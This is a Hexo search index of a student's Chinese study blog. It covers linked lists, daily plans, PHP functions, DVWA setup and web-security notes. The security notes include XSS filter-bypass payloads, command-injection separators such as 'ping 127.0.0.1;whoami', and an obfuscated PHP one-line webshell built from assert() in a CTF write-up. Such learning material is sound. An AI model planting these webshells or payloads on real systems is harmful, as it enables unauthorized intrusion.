<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>链表</title>
    <url>/2020/04/30/%E9%93%BE%E8%A1%A8/</url>
    <content><![CDATA[<h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
<thead>
<tr>
<th></th>
<th>数组</th>
<th>链表</th>
</tr>
</thead>
<tbody><tr>
<td>内存存储空间</td>
<td>需要<strong>连续</strong>的内存空间来存储</td>
<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
</tr>
<tr>
<td>插入、删除数据</td>
<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
</tr>
<tr>
<td>访问</td>
<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
</tr>
<tr>
<td>CPU缓存机制</td>
<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
</tr>
<tr>
<td>大小固定</td>
<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
<td><strong>优：</strong>支持动态扩容。</td>
</tr>
</tbody></table>
<blockquote>
<p>对于CPU缓存机制【转】</p>
<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
</blockquote>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
<p>循环链表的尾结点指向链表的头结点</p>
<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
<p>比单链表多了一个prev前驱节点</p>
<p><strong>优点：</strong>支持双向遍历</p>
<p><strong>缺点：</strong>占用过多内存空间</p>
<blockquote>
<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
</blockquote>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
<ol>
<li>先进先出【FIFO：First In，First Out】</li>
<li>最少使用策略【LFU：Least Frequently Used】</li>
<li>最近最少使用策略【LRU：Least Recently Used】</li>
</ol>
<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
<ol>
<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
</ol>
<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>

<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>

<p>特殊情况：向空链表插入第一个结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>

<p>特殊情况：删除最后一个结点</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
<p>这是可以考虑引入<strong>哨兵</strong>。</p>
<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
<li>如果链表为空</li>
<li>如果链表只包含一个结点</li>
<li>如果链表只包含两个结点</li>
<li>代码逻辑在处理头结点和尾结点时</li>
</ol>
<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
<li>单链表反转</li>
<li>链表中环的检测</li>
<li>两个有序链表的合并</li>
<li>删除链表倒数第n个结点</li>
<li>求链表的中间结点</li>
</ul>
]]></content>
      <categories>
        <category>数据结构与算法之美</category>
      </categories>
  </entry>
  <entry>
    <title>XSS</title>
    <url>/2020/03/19/XSS/</url>
    <content><![CDATA[<h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>



<h4 id="html实体字符及"><a href="#html实体字符及" class="headerlink" title="html实体字符及"></a>html实体字符及<svg/></h4><p>如果过滤()、[]和``</p>
<p>则可以使用html实体字符代替括号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert &amp;#40; 1 &amp;#41;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert &amp;#40; 1 &amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>第一个必须要加<svg>标签，第二个可不加（我寻思可能是第一个不在标签里面）。</svg></p>
<h4 id="闭合注释"><a href="#闭合注释" class="headerlink" title="闭合注释"></a>闭合注释</h4><p>闭合注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--   --&gt;</span><br><span class="line">&lt;!--   --!&gt;</span><br></pre></td></tr></table></figure>



<h4 id="换行过滤"><a href="#换行过滤" class="headerlink" title="换行过滤"></a>换行过滤</h4><p>对于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input &#x3D; input.replace(&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig, &#39;_&#39;)</span><br><span class="line">  return &#96;&lt;input value&#x3D;1 $&#123;input&#125; type&#x3D;&quot;text&quot;&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可使用<strong>换行绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">src&#x3D;1 type&#x3D;image onerror</span><br><span class="line">&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>



<h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h4><p>对于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi</span><br><span class="line"></span><br><span class="line">  input &#x3D; input.replace(stripTagsRe, &#39;&#39;)</span><br><span class="line">  return &#96;&lt;article&gt;$&#123;input&#125;&lt;&#x2F;article&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可利用浏览器的兼容性直接输入未闭合标签</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>留一个没有解决的小问题，为什么此题不能用换行绕过？</p>
<p>我猜是因为const的缘故？</p>
</blockquote>
<h4 id="style闭合"><a href="#style闭合" class="headerlink" title="style闭合"></a>style闭合</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src &#x3D; src.replace(&#x2F;&lt;\&#x2F;style&gt;&#x2F;ig, &#39;&#x2F;* \u574F\u4EBA *&#x2F;&#39;)</span><br><span class="line">  return &#96;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我先试了下老书上的方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;BODY&#123;background:url(&quot;javascript:alert(1)&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p>失败了。</p>
<p>于是</p>
<ol>
<li><p>   多一个空格</p>
</li>
<li><pre><code>&lt;/style
&gt;</code></pre><blockquote>
<p>不知道为啥这里又可以换行了</p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>web安全漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>命令执行/代码执行</title>
    <url>/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
<li><p><strong>command1 &amp; command2 ：</strong></p>
<p>不管command1执行成功与否，都会执行command2（将上一个命令的输出作为下一个命令的输入）</p>
</li>
<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
<p>先执行command1执行成功后才会执行command2</p>
</li>
<li><p><strong>command1 | command2 ：</strong></p>
<p>只执行command2</p>
</li>
<li><p><strong>command1 || command2 ：</strong></p>
<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
</li>
</ul>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
<li><p>;   前面的执行完执行后面的    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>|   管道符，显示后面的执行结果  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>||  当前面的执行出错时执行后面的  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
</li>
<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>



</li>
</ul>
<blockquote>
<p><strong>常用url编码</strong> ：<br> %20 = 空格<br> %5c = <br> %26 = &amp;<br> %7c = |</p>
</blockquote>
<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
]]></content>
      <categories>
        <category>web安全漏洞</category>
      </categories>
  </entry>
  <entry>
    <title>在kali-linux下搭建DVWA</title>
    <url>/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/</url>
    <content><![CDATA[<p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
<ol>
<li><p>解压压缩包到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html</span><br></pre></td></tr></table></figure>

<p>并重命名为dvwa</p>
</li>
<li><p>将apache2停止：service apache2 stop</p>
</li>
<li><p>给dvwa文件夹相应的权限：chmod -R 755 /var/www/html/dvwa</p>
</li>
<li><p>启动mysql服务： service mysql start</p>
</li>
<li><p>打开mysql： mysql -u root -p</p>
</li>
<li><p>创建数据库：create database dvwa;</p>
</li>
<li><pre><code>grant all on dvwa.* to dvwa@localhost identified by &apos;password&apos;;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">   这里划重点：dvwa是dvwa_id，password是dvwa_password.</span><br><span class="line"></span><br><span class="line">8.  退出mysql：exit</span><br><span class="line"></span><br><span class="line">9. 启动apache2服务：service apache2 start</span><br><span class="line"></span><br><span class="line">10.</span><br></pre></td></tr></table></figure>
 cd /var/www/html/dvwa/config/</code></pre></li>
<li><p>然后打开config.inc.php修改那个user和password（见7）</p>
</li>
<li><p>最后打开浏览器访问127.0.0.1/dvwa即可</p>
</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>杂七杂八</tag>
        <tag>DVWA</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku过狗一句话</title>
    <url>/2020/03/01/bugku%E8%BF%87%E7%8B%97%E4%B8%80%E5%8F%A5%E8%AF%9D/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">送给大家一个过狗一句话</span><br><span class="line">&lt;?php $poc&#x3D;&quot;a#s#s#e#r#t&quot;; $poc_1&#x3D;explode(&quot;#&quot;,$poc); $poc_2&#x3D;$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET[&#39;s&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>先看这段php</p>
<ul>
<li><p>explode(‘分割的字符’，被分割的字符串)</p>
<p>explode函数将原来的字符串以分割字符为界限，分成若干元素计入数组</p>
</li>
</ul>
<p>所以$poc_1=[a,s,s,e,r,t],$poc_2=assert.</p>
<p>也就是通过get方法获取s元素的值并放入assert执行。</p>
<blockquote>
<p>assert（）：把字符串按照php代码来执行。</p>
</blockquote>
<p>于是接下来有两种方法：</p>
<ul>
<li><strong>s=print_r(scandir(‘./‘)) 然后读取fl4g.txt</strong></li>
<li><strong>s=print_r(glob(“*.*“)) 然后读取show_source(“fl4g.txt”)</strong></li>
<li><strong>使用file_get_contents(“flag.txt”)读取文件</strong></li>
<li><strong>还有system(‘ls’)的读取方法但是这里应该没有权限.</strong></li>
</ul>
<p>然而这道题好像除了点问题，咋弄都没反应，希望早日调试好错误。</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-29日目标</title>
    <url>/2020/02/28/2020-02-29%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-29日目标"><a href="#2020-02-29日目标" class="headerlink" title="2020-02-29日目标"></a>2020-02-29日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-9：30</td>
<td>sql书</td>
</tr>
<tr>
<td>9：45-11：00</td>
<td>高数</td>
</tr>
<tr>
<td>11：15-12：00</td>
<td>JS</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>c语言</td>
</tr>
<tr>
<td>15：30-16：15</td>
<td>物理</td>
</tr>
<tr>
<td>16：30-17：30</td>
<td>JS</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>keep</td>
</tr>
<tr>
<td>21：00-</td>
<td>刷刷题</td>
</tr>
<tr>
<td>24：00</td>
<td>睡觉</td>
</tr>
</tbody></table>
<h2 id="2020-02-28总结"><a href="#2020-02-28总结" class="headerlink" title="2020-02-28总结"></a>2020-02-28总结</h2><ol>
<li>看完了JS第二章第三章</li>
<li>看了b站c语言p3-p7</li>
<li>sql第三章</li>
<li>keep腰腹减脂+跑步机20min</li>
<li>看家里的网有点慢，就重置了哈路由器，这玩意还有点复杂，一堆乱七八糟的密码，不过还是弄好啦（感觉上快了不少）。</li>
</ol>
<p>今天起晚了，加上下午看指针进入了状态所以就多看了一点，有些东西没有完成，明天加油（明天吃火锅）。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-28日目标</title>
    <url>/2020/02/27/2020-02-28%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-28日目标"><a href="#2020-02-28日目标" class="headerlink" title="2020-02-28日目标"></a>2020-02-28日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-10：00</td>
<td>高数</td>
</tr>
<tr>
<td>10：15-11：00</td>
<td>JS</td>
</tr>
<tr>
<td>11：15-12：00</td>
<td>sql书71-99</td>
</tr>
<tr>
<td>14：00-15：30</td>
<td>c语言</td>
</tr>
<tr>
<td>15：45-16：30</td>
<td>JS</td>
</tr>
<tr>
<td>16：45-17：30</td>
<td>物理</td>
</tr>
<tr>
<td>19：30-20：30</td>
<td>sql书99-109</td>
</tr>
<tr>
<td></td>
<td>keep</td>
</tr>
<tr>
<td></td>
<td>刷题</td>
</tr>
<tr>
<td></td>
<td>整理</td>
</tr>
</tbody></table>
<ul>
<li>学电脑：6h</li>
<li>锻炼：30min</li>
<li>大学内容：3h</li>
</ul>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-27日目标</title>
    <url>/2020/02/26/2020-02-27%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-27日目标"><a href="#2020-02-27日目标" class="headerlink" title="2020-02-27日目标"></a>2020-02-27日目标</h2><p>Everything gonna be Okey。</p>
<table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-9：30</td>
<td>预习高数</td>
</tr>
<tr>
<td>9：45-10：45</td>
<td>JS</td>
</tr>
<tr>
<td>11：00-12：00</td>
<td>英语网课</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>16：00-17：40</td>
<td>物理网课</td>
</tr>
<tr>
<td>19：30-20：00</td>
<td>keep</td>
</tr>
<tr>
<td>20：45-22：00</td>
<td>sql书</td>
</tr>
<tr>
<td>23：30</td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-26日目标</title>
    <url>/2020/02/25/2020-02-26%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-26日目标"><a href="#2020-02-26日目标" class="headerlink" title="2020-02-26日目标"></a>2020-02-26日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：30-10：00</td>
<td>sql</td>
</tr>
<tr>
<td>10：20-12：00</td>
<td>c语言网课</td>
</tr>
<tr>
<td>14：00-15：15</td>
<td>高数作业+数学通识</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>JAVASCRIPT网课</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>c语言指针</td>
</tr>
<tr>
<td>20：15-21：30</td>
<td>刷题</td>
</tr>
<tr>
<td>21：40-22：30</td>
<td>整理一些琐事杂事</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-25日目标</title>
    <url>/2020/02/24/2020-02-25%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-25日目标"><a href="#2020-02-25日目标" class="headerlink" title="2020-02-25日目标"></a>2020-02-25日目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：20-10：00</td>
<td>英语网课</td>
</tr>
<tr>
<td>10：20-12：00</td>
<td>物理网课</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>16：00-17：15</td>
<td>sql书</td>
</tr>
<tr>
<td>19：00-20：30</td>
<td>c语言</td>
</tr>
<tr>
<td>20：45-22：00</td>
<td>结合sql书，完成sqli-labs</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-24总结"><a href="#2020-02-24总结" class="headerlink" title="2020-02-24总结"></a>2020-02-24总结</h2><ol>
<li><p>看了c语言的几种变量</p>
</li>
<li><p>sql书看了第2章</p>
</li>
<li><p>写好了菜单程序</p>
</li>
<li><p>做好了mooc</p>
</li>
<li><p>看DVWA的js，还是不太精通啊，还得再夯实一下基础知识。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-24日目标</title>
    <url>/2020/02/23/2020-02-24%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-24目标"><a href="#2020-02-24目标" class="headerlink" title="2020-02-24目标"></a>2020-02-24目标</h2><table>
<thead>
<tr>
<th>7：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>7：00-8：00</td>
<td>英语</td>
</tr>
<tr>
<td>8：20-10：00</td>
<td>c语言网课</td>
</tr>
<tr>
<td>10：30-12：00</td>
<td>sql书</td>
</tr>
<tr>
<td>14：00-15：40</td>
<td>近代史网课</td>
</tr>
<tr>
<td>16：00-17：40</td>
<td>高数网课</td>
</tr>
<tr>
<td>19：00-19：30</td>
<td>sql书</td>
</tr>
<tr>
<td>19：30-21：10</td>
<td>音乐鉴赏网课</td>
</tr>
<tr>
<td>21：30-22：30</td>
<td>DVWA JavaScript</td>
</tr>
<tr>
<td>24：00</td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-23总结"><a href="#2020-02-23总结" class="headerlink" title="2020-02-23总结"></a>2020-02-23总结</h2><ol>
<li>完成DVWA  weak sid</li>
<li>完成DVWA csp bypass（high级别以后再深入理解）</li>
<li>看了sql第二节</li>
<li>看了c语言指针第三节</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php查询函数整理</title>
    <url>/2020/02/22/php%E6%9F%A5%E8%AF%A2%E5%87%BD%E6%95%B0%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h3 id="substr"><a href="#substr" class="headerlink" title="substr()"></a>substr()</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">substr(string,start,length)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>start:(数字)开始的位置 【必须】</li>
<li>length:搜索的长度【可选】</li>
</ul>
<p>返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。</p>
<p><a href="http://albatross-g.site/2020/02/01/php-substr-%E5%87%BD%E6%95%B0-%E8%BF%94%E5%9B%9E%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%B8%80%E9%83%A8%E5%88%86/#%E8%AF%AD%E6%B3%95" target="_blank" rel="noopener">详细</a></p>
<h3 id="stristr-不区分大小写"><a href="#stristr-不区分大小写" class="headerlink" title="stristr(不区分大小写)"></a>stristr(不区分大小写)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">stristr(string,search,before_search)</span><br></pre></td></tr></table></figure>

<ul>
<li>string:被搜索的字符串【必须】</li>
<li>search:所搜索的字符串【必须】</li>
<li>before_search:设置布尔值：true则返回搜索前的字符串（以搜索的第一个字符为准）【可选】</li>
</ul>
<p>返回字符串的剩余部分（从匹配点）。如果未找到所搜索的字符串，则返回 FALSE。</p>
<blockquote>
<p>要区分大小写用 ： strstr()</p>
</blockquote>
<h3 id="str-replace（区分大小写）"><a href="#str-replace（区分大小写）" class="headerlink" title="str_replace（区分大小写）"></a>str_replace（区分大小写）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">str_replace(find,replace,string,count)</span><br></pre></td></tr></table></figure>

<ul>
<li>find：所搜索的值【必须】</li>
<li>replace：替换的值【必须】</li>
<li>string：被搜索的值【必须】</li>
<li>count：对替换的值进行计数【可选】</li>
</ul>
<p>返回带有替换值的字符串或数组。</p>
<blockquote>
<p>如要对大小写不敏感则用 ：str_ireplace（）</p>
</blockquote>
